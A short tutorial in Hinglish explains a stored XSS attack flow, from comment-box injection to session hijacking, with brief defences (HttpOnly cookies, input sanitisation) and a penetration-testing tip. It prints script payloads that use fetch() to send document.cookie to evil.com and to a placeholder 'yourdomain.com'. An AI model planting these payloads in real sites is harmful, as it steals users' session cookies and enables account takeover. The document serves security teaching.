# 🔁 Full XSS Exploit Flow (Stored XSS):

1. Attacker ne comment box mein yeh payload inject kiya:

**<script>
fetch("https://evil.com/steal?cookie=" + document.cookie);
</script>**

2. Yeh comment store ho gaya database mein (Stored XSS).

3. Jab koi innocent user (victim) wo page open karta hai:

<script> tag execute hota hai.

document.cookie victim ki session ID fetch karta hai.

fetch() se attacker ki website pe cookie chali jaati hai.

4. Attacker ko session cookie mil jaati hai.

Ab attacker victim ka account hijack kar sakta hai.

Ya phir impersonate kar sakta hai as that user.

---

🔐 Real-life protection:

Agar website developer ne:

HttpOnly cookie lagayi hoti

Ya input ko encode/sanitize kiya hota
toh XSS ka payload fail ho jaata.

---

### ⚔️ Penetration Testing Tip:

Jab bhi koi comment box, profile bio, forum post, feedback form mile — test karo:

**<script>alert('XSS')</script>**

Agar popup aaya, toh Stored XSS confirm.
Ab payload escalate karo:

**<script>
fetch("https://yourdomain.com/steal?cookie=" + document.cookie)
</script>**
